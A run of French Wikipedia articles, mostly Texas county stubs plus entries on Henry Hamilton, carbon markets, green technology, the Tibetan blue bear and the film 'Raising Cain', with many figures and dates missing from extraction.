Selon l""', pour la période 2011-2015, 82,09 % de la population âgée de plus de déclare parler l'espagnol à la maison, 13,64 % l'anglais, 1,61 % déclare parler le tagalog, 1,56 % le coréen et 1,1 % une autre langue.

</doc>
<doc id="1873563" url="https://fr.wikipedia.org/wiki?curid=1873563" title="Henry Hamilton">
Henry Hamilton

Henry Hamilton (c.1734 – ) est un officier et administrateur colonial britannique né en Irlande. Il fut fait prisonnier durant la guerre d'indépendance américaine alors qu'il était le lieutenant-gouverneur de l'établissement britannique de Fort Detroit. Il fut aussi lieutenant-gouverneur de la province de Québec sous Haldimand.
Début de carrière.
Hamilton est probablement né à Dublin. Il était le fils cadet de Henry Hamilton (1692–1743), député de Donegal au parlement irlandais. Il passa sa jeunesse à Cork, puis commença sa carrière militaire quand son père lui acheta une commission au d'infanterie en 1755. Il participa à la guerre de Sept Ans en Amérique, notamment lors de la prise de Louisbourg et de la bataille des plaines d'Abraham. Avec l'appui du lieutenant-gouverneur du Canada Guy Carleton, Hamilton accéda au grade de major de brigade. En 1775, il vendit sa commission et quitta l'armée pour entreprendre une carrière politique.
La guerre d'indépendance américaine.
En 1775, Hamilton fut nommé lieutenant-gouverneur et surintendant des affaires indiennes à Fort Detroit, un des cinq nouveaux postes de lieutenant-gouverneur créés par suite du récent agrandissement de la Province de Québec. La guerre d'indépendance des États-Unis était déjà commencée à l'arrivée de Hamilton à Détroit. Il se retrouvait dans une situation délicate: en tant que gouverneur civil, son autorité sur les troupes était incertaine, et les habitants de la région, principalement des Canadiens (francophones) et des Amérindiens, n'étaient pas bien disposés face à l'administration britannique.
Hamilton se révéla être un adroit diplomate dans ses relations avec les Amérindiens, établissant de bonnes relations avec les chefs locaux. Au début de la guerre, les Britanniques ne voulaient pas se servir des Amérindiens comme alliés combattants, mais de nouvelles instructions reçues en 1777 demandaient à Hamilton d'encourager les raids amérindiens sur les établissements frontaliers de Virginie et de Pennsylvanie. C'était une politique controversée car il était inévitable que des colons civils seraient tués durant ces raids. Hamilton tenta de limiter les pertes civiles en envoyant des officiers britanniques et des miliciens canadiens avec les troupes d'Amérindiens. Néanmoins, des centaines de colons du Kentucky et de l'ouest de la Pennsylvanie furent tués et souvent scalpés par les bandes armées. Aux États-Unis, Hamilton acquit le surnom de «Général acheteur de scalps» "(Hair-buyer General)", à cause des sommes qu'il aurait versées aux Amérindiens en échange des chevelures des colons, et devint ainsi l'objet d'une haine tenace de la part des Américains. Cependant aucune preuve irréfutable de ce commerce n'a semble-t-il été trouvée.
En 1778, des milices de Virginie sous le commandement du colonel George Rogers Clark capturèrent quelques postes britanniques peu défendus dans la région de l'Illinois, notamment Kaskaskia et Vincennes. À la fin d'août, Hamilton arriva de Détroit et réussit à reprendre Vincennes au début de l'hiver. Cependant, Clark revint par surprise en , reprit le fort et captura Hamilton.
À cause de son implication dans les raids Amérindiens, les Virginiens considéraient Hamilton comme un criminel de guerre plutôt que comme un prisonnier de guerre ordinaire. Clark envoya Hamilton à Williamsburg (Virginie) sous la garde du gouverneur Thomas Jefferson qui le gardait souvent les fers aux pieds. Après 18 mois de captivité, et grâce à l'intervention de George Washington, Hamilton fut finalement libéré sur parole au début de 1781 et put retourner à Londres à la faveur d'un échange de prisonniers.
Carrière subséquente.
Hamilton fut bientôt nommé lieutenant-gouverneur de la province de Québec en remplacement d'Hector Cramahé, sur la recommandation de Haldimand. Il repassa au Canada en , et il prit dès son arrivée partie en faveur des colons et marchands britanniques, la plupart du temps en opposition au gouverneur Haldimand. Celui-ci ne pouvait cependant pas le limoger. Quand Haldimand dut se rendre en Angleterre à l'automne 1784, Hamilton prit la responsabilité de la colonie. Durant son administration, l'opposition entre le "French party" de l'entourage de Haldimand, et les partisans de Hamilton fut orageuse. Cette lutte fut la cause de la révocation de Hamilton, qui dut remettre le pouvoir à Henry Hope et rentrer en Grande-Bretagne le . Plus tard il devint gouverneur des Bermudes (1786-1793) et de la Dominique (1795-1796). Il se maria à un âge avancé à Elizabeth Lee, et leur fille unique mourut sans enfants en 1871. Hamilton mourut à Antigua en 1796 durant son mandat de gouverneur de la Dominique.
Il donna son nom à la capitale des Bermudes, desquelles il était gouverneur quand la ville fut fondée en 1783.

</doc>
<doc id="1873566" url="https://fr.wikipedia.org/wiki?curid=1873566" title="Giovanni Battista Angioletti">
Giovanni Battista Angioletti

Giovanni Battista Angioletti (Milan, - Santa Maria la Bruna, Torre del Greco, ) était un journaliste et un écrivain italien.
Biographie.
Possédant une intelligence vive et réfléchie, Angioletti entreprend dans sa jeunesse des études d'ingénieur. Cependant, après la longue interruption qui lui est imposée par la Première Guerre mondiale, il préfèrera s'orienter vers la littérature et le journalisme.
Parallèlement à son travail de romancier, il écrit aussi pour des journaux, d'abord dans des publications mineures. En 1928 il obtient le Prix Bagutta et devient par la suite collaborateur du "Corriere della Sera" et codirecteur de l"'Italia letteraria" en 1929. En 1930, il fonde la revue "Trifalco".
À partir de 1934 il fait de multiples séjours à l'étranger en tant que lecteur à l'université (Dijon, Besançon) et directeur d'instituts italiens de culture (Prague, Paris). Il séjourne en France pendant la plus grande partie de la Seconde Guerre mondiale, rentrant en Italie seulement en 1945 alors que son permis de séjour ne lui est pas renouvelé.
En 1949, il obtient le Prix Strega pour "La memoria", publié chez Bompiani.
Il fut le fondateur de la Communauté européenne des écrivains, qu'il présida, et fut secrétaire du Syndicat national des écrivains italiens. Angioletti a aussi collaboré avec la RAI dont il dirigea même quelques programmes culturels.

</doc>
<doc id="1873567" url="https://fr.wikipedia.org/wiki?curid=1873567" title="Comté de Rains">
Comté de Rains

Le comté de Rains, en "", est un comté situé au nord-est de l'État du Texas aux États-Unis. Fondé le , son siège de comté est la ville d'Emory. Selon le recensement des États-Unis de 2020, sa population est de . Le comté a une superficie de , dont en surfaces terrestres. Il est baptisé en référence à Emory Rains, un juge et personnalité politique de la république du Texas.
Organisation du comté.
Le comté est fondé le , à partir de terres des comtés de Hopkins, Hunt, Van Zandt et Wood. Il est définitivement organisé et autonome, le . 
Le comté est baptisé en mémoire d', avocat, juge et dirigeant politique de la république du Texas puis, par la suite, de l'État du Texas.
Géographie.
Le comté de Rains se situe au nord-est de l'État du Texas, sur le cours supérieur du fleuve Sabine, aux États-Unis.
Il est l'un des plus petits comtés de l'État et plus de 10 % de ses terres sont immergées depuis la création des lacs Tawakoni et . Il a une superficie totale de , composée de de terres et de de zones aquatiques.
L'altitude varie de à .
Démographie.
Lors du recensement de 2010, le comté comptait une population de . En 2017, la population est estimée à .
Selon l"", pour la période 2011-2015, 93,56 % de la population âgée de plus de déclare parler anglais à la maison, alors que 5,81 % déclare parler l’espagnol et 0,63 % une autre langue.

</doc>
<doc id="1873568" url="https://fr.wikipedia.org/wiki?curid=1873568" title="Union des écrivaines et écrivains québécois">
Union des écrivaines et écrivains québécois



</doc>
<doc id="1873569" url="https://fr.wikipedia.org/wiki?curid=1873569" title="Comté de Randall">
Comté de Randall

Le comté de Randall, en ", est un comté situé dans le nord de l'État du Texas aux États-Unis. Le siège du comté est Canyon. Selon le recensement de 2020, sa population est de .
Géographie.
Le comté a une superficie de , dont en surfaces terrestres.
Démographie.
Selon l"', pour la période 2011-2015, 89,55 % de la population âgée de plus de déclare parler espagnol à la maison, alors que 8,22 % déclare parler l’anglais et 2,23 % une autre langue.

</doc>
<doc id="1873570" url="https://fr.wikipedia.org/wiki?curid=1873570" title="Comté de Reagan">
Comté de Reagan

Le comté de Reagan, en "", est un comté situé dans l'Ouest de l'État du Texas aux États-Unis. Fondé le , son siège de comté est la ville de Big Lake. Selon le recensement des États-Unis de 2020, sa population est de . Le comté a une superficie de , dont en surfaces terrestres. Il est nommé en référence à John Henninger Reagan, sénateur, originaire du Texas.
Organisation du comté.
Le , le comté de Reagan est fondé à partir des terres du comté de Tom Green. Il est définitivement organisé et autonome, le . 
Le comté est baptisé en référence au sénateur John Henninger Reagan, premier président de la commission des chemins de fer.
Géographie.
Le comté de Reagan se situe au nord-ouest du plateau d'Edwards, dans l'État du Texas aux États-Unis.
Il a une superficie totale de , composée de de terres et de de zones aquatiques.
L'altitude varie de à .
Démographie.
Lors du recensement de 2010, le comté comptait une population de . En 2017, la population est estimée à .

</doc>
<doc id="1873571" url="https://fr.wikipedia.org/wiki?curid=1873571" title="Homicide à Hollywood">
Homicide à Hollywood



</doc>
<doc id="1873572" url="https://fr.wikipedia.org/wiki?curid=1873572" title="Négociant en carbone">
Négociant en carbone

Un négociant en carbone, est un acteur financier transigeant des crédits-carbone.
Les crédits-carbone sont des instruments financiers générés par l'implémentation de projets de réduction d'émissions de gaz à effet de serre, par l'utilisation de technologies vertes, ou par des mesures d'efficacité énergétique.
La négociation peut se faire sur différent marché du carbone existant en Europe, en Amérique ou ailleurs (Japon, Australie).
Selon la Banque mondiale, la valeur du marché du carbone fut de 11 milliards de dollar US en 2005, la première année de négociation. Le marché fut évalué à 30 milliards de dollars pour l'année 2006, et est estimé à 64 milliards de dollars pour l'année 2007. Le marché du carbone est un des secteurs connaissant la plus forte croissance. D'ici 2020, le marché mondial du carbone pourrait atteindre 565 milliards de dollars US selon Point Carbon, une firme de recherche spécialisé de Oslo.
Changements climatiques.
Selon le GIEC, les émissions de carbone, venant principalement des énergies fossiles, doivent être stabilisées d'ici 2015 et ensuite réduites. Faute de quoi, les conséquences pourraient être désastreuses, selon le président du GIEC, Rajendra Kumar Pachauri. Déjà, dans la situation actuelle, dès 2020, entre 75 et 250 millions de personnes en Afrique souffriront de pénurie d'eau, les habitants des mégapoles d'Asie seront menacés par les inondations des rivières et de la hausse du niveau de la mer, nombre d'espèces vont disparaître en Europe, et l'Amérique connaîtra des vagues de chaleur torrides. La conférence de l'ONU organisée à Bali, en Indonésie du 3 au , doit lancer les négociations pour un nouvel accord international sur la réduction des gaz à effet de serre, en remplacement du protocole de Kyoto, expirant en 2012.

</doc>
<doc id="1873573" url="https://fr.wikipedia.org/wiki?curid=1873573" title="Comté de Real">
Comté de Real

Le comté de Real, en "", est un comté situé au sud de la partie centrale de l'État du Texas aux États-Unis. Fondé le , son siège de comté est la ville de Leakey. Selon le recensement des États-Unis de 2020, sa population est de .
Le comté a une superficie de , dont en surfaces terrestres. Il est nommé en référence à Julius Real, sénateur du Texas.
Organisation du comté.
Le comté de Real est créé le , à partir des terres des comtés de Bandera, Edwards et Kerr. Il est définitivement organisé et autonome, le .
Il est baptisé en l'honneur de Julius Real, sénateur du Texas, à partir de 1908.
Géographie.
Le comté de Real est situé au sud de la partie centrale de l'État du Texas, aux États-Unis.
Il a une superficie totale de , composée de de terres et de de zones aquatiques.
Démographie.
Lors du recensement de 2010, le comté comptait une population de . En 2017, la population est estimée à .

</doc>
<doc id="1873574" url="https://fr.wikipedia.org/wiki?curid=1873574" title="Marché des quotas carbone">
Marché des quotas carbone

Un marché de quotas carbone est un système d'échange de droits d'émissions de gaz à effet de serre, de crédits carbone et de "quotas carbone". Selon le rapport 2020 de l'« "International Carbon Action Partnership" », 21 marchés du carbone sont mis en place et 24 autres sont en cours de développement ou en projet.
Le marché des quotas carbone est l'une des options permettant de donner un prix au carbone. Il est porté par l'industriel qui privilégie cette solution recourant au marché financier, plutôt qu'une simple taxe carbone.
Après une phase de jeunesse en rapide croissance et un portage fort par l'Europe, le marché européen s'effondre à la suite de la crise économique mondiale de 2008 et reste déprimé jusque début 2017. Une réforme du marché du carbone adoptée en 2017 fait bondir le prix du carbone qui quadruple en un an.
Objectifs.
Un marché de quotas carbone (ou « système d'échange de quotas d'émission de gaz à effet de serre »), est un outil de politique publique visant à réduire les émissions de gaz à effet de serre (principalement le dioxyde de carbone), responsables du réchauffement climatique. Cette politique consiste à faire payer par des émetteurs le coût de la nuisance pour le climat que constituent leurs émissions, selon le principe pollueur-payeur. Ce coût supplémentaire pour les émetteurs doit les inciter à réduire leurs émissions, par exemple en réduisant leurs consommation d'énergie, en utilisant de l'énergie de récupération (récupération de chaleur notamment), ou en utilisant des énergies alternatives, renouvelables (solaire, éolien) plutôt que des fossiles (pétrole, gaz, charbon).
Un quota carbone et une taxe carbone poursuivent un même objectif : réduire les émissions. La différence : en créant une taxe, les autorités fixent un prix au carbone ; en instaurant un marché de quotas, les autorités fixent un plafond aux émissions de carbone. Un marché du carbone, outil public qui instaure une limite aux émissions des installations couvertes par le marché, ne peut donc pas être assimilé à un marché financier ou un marché classique.
Histoire.
Les mécanismes de marchés environnementaux reposent sur l'analyse du Prix Nobel Ronald Coase qui, dans son article de 1960, « "The problem of social cost" », préconise l'attribution de droits de propriété par l'État pour éviter de recourir à la taxation ou à la réglementation pour corriger les externalités négatives touchant des biens publics.
Le marché des quotas carbone est l'une des options qui existent pour donner un prix au carbone. Il est porté par l'industrie qui privilégie cette solution recourant au marché, plutôt qu'une simple taxe carbone.
Le marché européen, appelé en anglais le (EU ETS), n'est pas le premier marché de quotas. Le premier a été créé aux États-Unis pour combattre les émissions de polluants atmosphériques causant les pluies acides, tels que définis dans le protocole de Montréal ("Acid rain program") et il permet de notablement diminuer les pluies acides. Il y a des différences importantes avec le système de bourse du carbone, qui rendent impossible toute comparaison entre ces deux systèmes.
Le dispositif des systèmes d'échange de quotas d'émission de gaz à effet de serre est prévu par le protocole de Kyoto signé en 1997.
Lors du forum économique mondial à Gleneagles en , forment un groupe commun lors de la réunion pour le changement du climat du G8 : Ford, Toyota, et British Petroleum en font partie. Le , ce groupe publie une déclaration commune mentionnant le fait qu'il était nécessaire d'agir contre le changement climatique, et qui insiste sur l'importance de trouver des solutions basées sur le marché ; cette initiative est à l'origine des rencontres annuelles « Gleneagles Dialogue » entre les ministres de l'Énergie et de l'Environnement des les plus consommateurs d'énergie du monde.
Principes et fonctionnement.
Sur un marché du carbone une entité publique (par exemple l'Organisation des Nations unies, l'Union européenne ou un État, etc.) fixe aux émetteurs de gaz à effet de serre un plafond d'émission plus bas que leur niveau d'émission actuel et leur distribue des quotas d'émission correspondant à ce plafond.
À la fin d'une certaine période, les émetteurs doivent prouver qu'ils ont respecté leurs obligations en rendant à cette autorité publique un volume de quotas équivalent à leur volume d'émissions sur la période. Ceux qui ont émis plus de gaz à effet de serre que le niveau autorisé doivent acheter les quotas qui leur manquent, sauf à se voir infliger une forte amende en général non libératoire. Inversement, ceux qui ont émis moins que leur quantité allouée de quotas peuvent vendre les quotas dont ils n'ont pas besoin sur le marché ou bien, lorsque le marché le permet, les conserver en vue de les utiliser ultérieurement.
L'unité de compte et d'échange, le quota, représente 1 tonne de (ou gaz à effet de serre équivalent). Les transactions peuvent se faire sur un marché organisé (une bourse du carbone), ou de gré à gré ("Over The Counter"), directement entre un acheteur et un vendeur.
Le prix du quota dépend avant tout de la quantité de quotas émise par l'entité publique c'est-à-dire du niveau du plafond fixé : moins elle distribue de quotas par rapport aux émissions, plus les émetteurs de carbone doivent réduire leurs émissions ou acheter des quotas. Le prix reflète ainsi le degré d'ambition de la politique climatique. Dans ce cadre, le prix s'établit par les échanges entre acteurs du marché, au niveau d'équilibre entre l'offre et la demande de quotas. D'autres facteurs ont une influence sur le prix des quotas :
Marché européen.
Le , (SCEQE ou encore – EU ETS).
Environ centrales électriques et sites industriels très émetteurs de doivent disposer de quotas suffisants pour couvrir leurs émissions (quotas échangeables entre obligés). Des quotas sont distribués gratuitement à certains industriels et les États cherchent à préserver des « industries essentielles » dont certaines . Pour réduire les émissions européennes (de 40 % entre 1990 et 2030), les émissions incluses dans le marché carbone européen devront être réduites de 43 % par rapport à 2005 (et non 1990).
Le marché du carbone connaît de graves dysfonctionnements. Après une phase de jeunesse en rapide croissance et un portage fort par l'Europe, il s'effondre, avec un prix des quotas tombé à moins de 10 euros la tonne, qui n'incite pas les industriels à réduire leurs émissions. Il reste déprimé depuis la crise de 2008 jusque début 2017.
Supposé pouvoir contribuer au développement des énergies renouvelables, il ne s'est pas montré capable, jusqu'en 2016, de significativement réduire ni même freiner les émissions en raison d'une chute du prix du carbone. Parmi les problèmes posés figurent le fait que l'aviation échappe en partie à ces quotas, et le transport maritime en totalité, ce que déplorent en 2017 les députés européens.
Malgré un gel de 900 millions de quotas (backloading) adopté en , et des projets de réforme de long terme avec par exemple la constitution d'une "réserve de stabilité" (validée en ), le marché du carbone ne tient pas ses promesses : environ 2 milliards de quotas seraient en surplus, qu'il faudrait supprimer pour lancer le marché. En , face à cet échec et avant que le Conseil européen se prononce, les députés européens votent (en février) un nouveau projet de réforme du système européen d'échange de quotas d'émission de gaz à effet de serre (ETS), réforme valable jusqu'en 2030 ; mais seuls 800 millions de quotas de pourraient dans ce cadre être annulés (alors qu'il faudrait en annuler plus de 2 milliards selon la dernière évaluation pour rééquilibrer le marché). Le député conservateur britannique, Ian Duncan, rapporteur du projet voulait réduire davantage les quotas alloués chaque année mais les députés n'ont pas retenu cette mesure. En plénière les députés européens refusent majoritairement tout mécanisme d'ajustement aux frontières pour .
En , les parlementaires européens proposent à la Commission européenne et au Conseil de l'Union européenne de créer 3 fonds (à financer par la mise aux enchères des quotas) pour 1) moderniser les systèmes énergétiques de certains États membres ; 2) doper l'investissement dans les renouvelables, la capture et le stockage du carbone (CSC) et les technologies à faibles émissions de carbone ; 3) permettre une « transition juste », via la formation et la réaffectation de la main d'œuvre touchée par la transition énergétique (financé par 2 % des recettes des enchères de quotas d'émissions).
En , un rapport du think tank "Carbon Tracker" révèle que le prix du carbone sur le système d'échange de quotas d'émission de l'Union européenne (SEQE) de l'UE a bondi de 310 % en un an ; il attribue cette hausse à l'anticipation par le marché de la mise en service à partir de de la réserve de stabilité du marché (MSR), pièce maîtresse de la réforme UE-ETS adoptée en 2017. Le prix de la tonne de devrait atteindre 25 euros fin 2018 et 40 euros d'ici 2023, ce qui devrait forcer l'Allemagne, l'Italie, l'Espagne et les Pays-Bas à utiliser plus de gaz et moins de charbon, comme cela a été observé au Royaume-Uni où un prix plancher du a été mis en place.
Après avoir progressé de 37 % en 2020, le prix des quotas carbone augmente encore de 15 % depuis le début de l'année 2021, atteignant le 12 février un record de la tonne. Cette hausse très rapide est alimentée en partie par la spéculation des hedge funds. S'il semble que cette hausse soit en partie due à des flux financiers, pas seulement en provenance des fonds spéculatifs mais aussi des fonds de pension, une autre dynamique vient de la remontée des objectifs de réduction de gaz à effet de serre de l'Union européenne. Le , le cours frôle les .
La hausse des cours se poursuit en 2021. Un premier record de 47€ la tonne est établi au printemps, rapidement battu par d'autres records.
En 2023, les États membres de l'Union européenne et le Parlement européen conviennent d'accélérer la transition énergétique dans l'UE, pour y diminuer d'au moins 12 % la consommation d'énergie finale à horizon 2030, y baisser les émissions de GES de 55 % d'ici 2030 par rapport à 1990, puis atteindre la neutralité carbone avant 2050. Ceci valide la réforme communautaire du marché du carbone, cadrée par une directive révisée sur le système d'échange de quotas d'émissions (Seqe) : dorénavant, ce système s'appliquera aussi aux logements et (peu à peu) au transport maritime et aériens intra-communautaires. En outre, un nouveau et second marché du carbone, dit "ETS2", sera dédié aux carburants routiers et au chauffage des bâtiments, accompagné d'un "Fonds social pour le climat" à partir de 2026, destiné à aider les ménages vulnérables et les micro-entreprises dans leur transition énergétique.
Un mécanisme d'ajustement carbone aux frontières concernera les importations contribuant le plus au réchauffement : acier, aluminium, ciment, électricité… pendant que les quotas d'émissions gratuits alloués aux industriels opérant dans l'UE seront progressivement supprimés. Les revenus acquis par les États-membres à partir des échanges de quotas d'émissions devront servir à soutenir des projets liés au climat et à l'énergie, ainsi que les aspects sociaux de la transition énergétique.
Fraudes.
De 2008 à 2009, le marché des ETS fait l'objet d'une escroquerie connue sous le nom de fraude à la TVA sur les quotas de carbone.
Autres marchés.
Selon le rapport « "International Carbon Action Partnership Status Report 2020" », 21 marchés du carbone sont mis en place sur quatre continents et 24 autres sont en projet ou en développement.
États-Unis.
Sept États du Nord-Est (le Connecticut, le Delaware, le Maine, le New Hampshire, le New Jersey, l'État de New York, et le Vermont) ont créé l'« Initiative Régionale contre l'Effet de Serre » (en anglais ou RGGI). Ses règles de fonctionnement ont été publiées en 2006, mais l'organisme n'est opérationnel qu'en 2009. Les États du Maryland, du Massachusetts, du Rhode Island et de Virginie l'ont rejoint ensuite.
En Californie, la mise en place d'un véritable système d'échange est prévue pour début 2014 en coopération avec le Québec.
Chine.
Après avoir testé depuis 2013 des marchés locaux dans sept de ses plus grandes villes (Pékin, Shanghai, la province de Canton, Chongqing…) avec l'objectif d'instaurer un système national d'ici à 2017, la Chine annonce le 1er février 2021 l'entrée en vigueur du marché national du carbone chinois, inspiré du système d'échanges de quotas d'émissions de l'Union européenne.
Le , la bourse de Shanghai lance les échanges du marché national chinois du carbone, qui devient le plus grand marché des « droits à polluer » au monde : il devrait couvrir environ 4,5 milliards de tonnes d'émissions de par an, soit 40 % des émissions de la Chine. Au début, seuls les producteurs d'énergie y seront soumis, soit , dont une large majorité de centrales à charbon, qui fournissent encore 57 % de l'électricité produite en Chine. Contrairement au marché européen, le système chinois n'est pas encore plafonné. Il est basé sur un facteur d'intensité carbone de la production, qui ne doit pas dépasser 0,877 tonne de pour 1 MWh produit, seuil plutôt généreux, selon les experts, qui devrait être rendu plus strict par la suite. Les entreprises recevront, dans un premier temps, tous leurs quotas carbone gratuitement, en fonction de leurs émissions de 2019 et 2020. Les enchères seront introduites plus tard. Seuls les petits producteurs d'énergie les plus polluants devraient avoir à en acheter sur le marché. Cependant, s'ils dépassent le facteur d'intensité requis, ils n'auront à acheter que 20 % des quotas qui leur manquent. Le prix des quotas carbone devrait donc rester faible. Refinitiv prévoit un montant de 5,20 euros la tonne en 2021, qui pourrait atteindre 20,50 euros en 2030. En 2022, les secteurs du ciment et de l'aluminium devraient également faire leur entrée sur le marché. L'acier devrait suivre rapidement pour que la plupart des secteurs industriels soient couverts d'ici à 2025. La pétrochimie, la chimie, les métaux non ferreux, le papier et l'aviation seront inclus à terme.
Nouvelle-Zélande.
Le marché du carbone néo-zélandais (ETS-NZ) est établi en 2008 et couvre près de 50 % des émissions de GES de la Nouvelle-Zélande. Le marché laisse la possibilité à certains acteurs d'adhérer volontairement au système(opt-in). En 2012, près de 1090 entités étaient prises en compte par l'ETS-NZ, qui couvre les six gaz à effet de serre du Protocole de Kyoto dans les secteurs de l'exploitation forestière, de l'énergie, des procédés industriels et des déchets.
Australie.
L'Australie imposait depuis juillet 2012 une taxe de australiens () aux 350 plus grandes entreprises du pays, et prévoyait de la remplacer en 2015 par un marché d'échange de quotas en Asie-Pacifique, à prix variables, fixés par le marché, à l'image du système mis en place en Europe. Mais le 17 juillet 2014, les sénateurs australiens ont voté l'abrogation de la taxe carbone et du marché des quotas d'émission de gaz carbonique qui allait lui succéder.
Corée du sud.
Les parlementaires sud-coréens ont adopté à la quasi-majorité en mai 2015 la mise en place d'un système de plafonnement et d'échange de quotas de qui devrait couvrir 60 % de ses émissions. Les émissions seront plafonnées à pour les entreprises les plus polluantes, qui devront en cas de dépassement s'acquitter de pénalités trois fois plus élevées que le prix de marché.
Royaume-Uni.
Du fait du Brexit, le Royaume-Uni est sorti du marché européen de quotas d'émissions de , géré à Londres par l'opérateur boursier américain ICE, qui a décidé de le déplacer à Amsterdam. ICE annonce en mars 2021 qu'une nouvelle plateforme d'échange de quotas de britannique serait opérationnelle à partir du 19 mai 2021].
Projets divers.
D'autres états ou régions, notamment la Corée du Sud et plus récemment le Cambodge et le Vietnam, envisagent en 2016 la mise en place de tels systèmes. L'Assemblée nationale vietnamienne a adopté le 17 novembre 2020 une révision de la loi sur la protection de l'environnement, qui donne mandat au ministère des Ressources naturelles et de l'Environnement pour concevoir un marché de quotas d'émission.

</doc>
<doc id="1873575" url="https://fr.wikipedia.org/wiki?curid=1873575" title="Technologie verte">
Technologie verte

La technologie verte est un ensemble de techniques visant l'amélioration de la qualité de l'environnement par la réduction des rejets toxiques dans l'air, dans l'eau ou dans le sol, par l'économie de ressources, l'utilisation de ressources renouvelables. 
On parle aussi de "« cleantechs »" pour désigner les "« technologies propres »" ou efficientes dans le domaine de l'énergie (smart grids par exemple).
Finance du carbone.
L'implémentation de stratégie de réduction d'émissions de GES permet la création de crédits-carbone, et favorise une diminution globale des niveaux de gaz à effet de serre.
Critiques.
Selon Philippe Bihouix, auteur de "L’âge des Low Tech. Vers une civilisation techniquement soutenable", les « technologies vertes » sont consommatrices de ressources, font appel à des métaux plus rares, et sont en général moins bien recyclables. Elles font croire qu'il serait possible de réduire les émissions de gaz à effet de serre significativement sans réduire massivement notre consommation énergétique. La « croissance verte », qui élude la question de nos modes de vie, est pour lui une mystification absolue. En raison de leur besoin de métaux rares, les énergies nouvelles ne sont pas la panacée : une énergie illimitée et propre est un mythe, il faut donc économiser, recycler, relocaliser.

</doc>
<doc id="1873576" url="https://fr.wikipedia.org/wiki?curid=1873576" title="Raffin">
Raffin



</doc>
<doc id="1873577" url="https://fr.wikipedia.org/wiki?curid=1873577" title="Comté de Palo Pinto">
Comté de Palo Pinto

Le comté de Palo Pinto, en "", est un comté situé au nord de la partie centrale de l'État du Texas aux États-Unis. Fondé le , son siège de comté est la ville de Palo Pinto. Selon le recensement des États-Unis de 2020, sa population est de . Le comté a une superficie de , dont en surfaces terrestres. Il est baptisé en référence la rivière "Palo Pinto", un affluent du fleuve Brazos.
Organisation du comté.
Le comté est fondé le , à partir de terres rattachées aux comtés de Coryell, de Bosque et de Parker. Il est définitivement organisé et autonome, le .
Le comté est baptisé en référence à la , un affluent du fleuve Brazos qui draine le comté.
Géographie.
Le comté de Palo Pinto se situe au nord de la partie centrale de l'État du Texas, aux États-Unis.
Il a une superficie totale de , composée de de terres et de de zones aquatiques.
L'altitude varie de à .
Démographie.
Lors du recensement de 2010, le comté comptait une population de . En 2017, la population est estimée à .
Voir aussi.
Bibliographie.
 

</doc>
<doc id="1873578" url="https://fr.wikipedia.org/wiki?curid=1873578" title="Aéroport international de Changi">
Aéroport international de Changi



</doc>
<doc id="1873579" url="https://fr.wikipedia.org/wiki?curid=1873579" title="Comté de Panola (Texas)">
Comté de Panola (Texas)

Le comté de Panola, en "", est un comté situé dans l'est de l'État du Texas aux États-Unis. Fondé le , son siège de comté est la ville de Carthage. Selon le recensement des États-Unis de 2020, sa population est de . Le comté a une superficie de , dont en surfaces terrestres. Son nom est un mot d'origine amérindienne pour désigner le coton.
Organisation du comté.
Le comté est fondé le , à partir des terres des comtés de Bexar et de
Gillespie. Il est définitivement organisé et autonome, le . 
Le comté est baptisé en référence au mot "ponolo", de la langue Cherokee, qui signifie en .
Géographie.
Le comté de Panola se situe à l'est de l'État du Texas, aux États-Unis. Il est bordé, à l'est, par l’État de Louisiane et traversé, du nord au sud, par le fleuve Sabine.
Il a une superficie totale de , composée de de terres et de de zones aquatiques.
Démographie.
Lors du recensement de 2010, le comté comptait une population de . En 2017, la population est estimée à .

</doc>
<doc id="1873580" url="https://fr.wikipedia.org/wiki?curid=1873580" title="Ours bleu du Tibet">
Ours bleu du Tibet

L'Ours bleu du Tibet (Ursus arctos pruinosus) est une des sous-espèces d'ours brun ("Ursus arctos") habitant le plateau tibétain en Asie centrale, au nord de l'Himalaya. En tibétain, il est connu sous le nom de "Dom gyamuk".
Cette sous-espèce qui figure en Annexe I de la CITES est en danger de disparition en raison de l'utilisation de sa bile dans la médecine chinoise.
Dans la culture populaire.
Dans la culture populaire du Tibet, cet ours est associé à la légende du yéti. Cet animal ayant une tendance très agressive n'hésiterait pas à s'attaquer au bétail des Tibétains, notamment du fait de la disparition du couvert végétal, mais aussi aux chevaux et aux autres ours.
Systématique.
Le nom valide complet (avec auteur) de ce taxon est "Ursus arctos pruinosus" .
Ce taxon porte en français le nom vernaculaire ou normalisé suivant : Ours brun du Tibet.
"Ursus arctos pruinosus" a pour synonyme :

</doc>
<doc id="1873582" url="https://fr.wikipedia.org/wiki?curid=1873582" title="L'Esprit de Caïn">
L'Esprit de Caïn

L'Esprit de Caïn ("Raising Cain") est un film américain réalisé par Brian De Palma et sorti en 1992.
Tout comme "Body Double", Brian De Palma rend ici un nouvel hommage à Alfred Hitchcock.
Synopsis.
Le docteur Carter Nix est un pédopsychiatre réputé. Il est marié à Jenny, également médecin. Carter décide d’abandonner sa carrière pour pouvoir élever leur fille, Amy, et ainsi vérifier certaines de ses théories . Il devient alors obsédé par l’éducation d'Amy et va découvrir que sa femme le trompe avec un dénommé Jack Dante. La « part sombre » de Carter prend alors les choses en main.
Production.
Développement.
Durant le tournage de son précédent film, "Le Bûcher des vanités", Brian De Palma imagine une ébauche de scénario d'un thriller, bien qu'il hésite à revenir à ce genre cinématographique qu'il a beaucoup pratiqué dans sa carrière. 
La scène dans laquelle le personnage incarné par John Lithgow immerge la voiture contenant le corps de sa femme évoque fortement la scène de "Psychose" (1960), lorsque Norman Bates (Anthony Perkins) pousse la voiture de Marion Crane (Janet Leigh) dans le marais derrière son motel. La crise de panique qui s'empare de Jenny (Lolita Davidovich) au moment de sa noyade peut apparaître comme une auto-citation de la part de Brian de Palma, et plus spécifiquement une référence à la scène de la noyade en voiture de Sally, personnage interprété par Nancy Allen, dans son film "Blow Out" (1981).
Attribution des rôles.
Le réalisateur retrouve ici John Lithgow, après "Obsession" (1976) et "Blow Out" (1981). Brian De Palma a avoué regretter de ne pas l'avoir également pris à la place de Tom Hanks pour son précédent film, "Le Bûcher des vanités", qui a été un cuisant échec public et critique. Il retrouve également l'acteur Steven Bauer, qu'il avait dirigé dans "Scarface" (1983).
Tournage.
Le tournage se déroule à Los Altos, Menlo Park, Mountain View, Palo Alto et San Francisco, en Californie.
Musique.
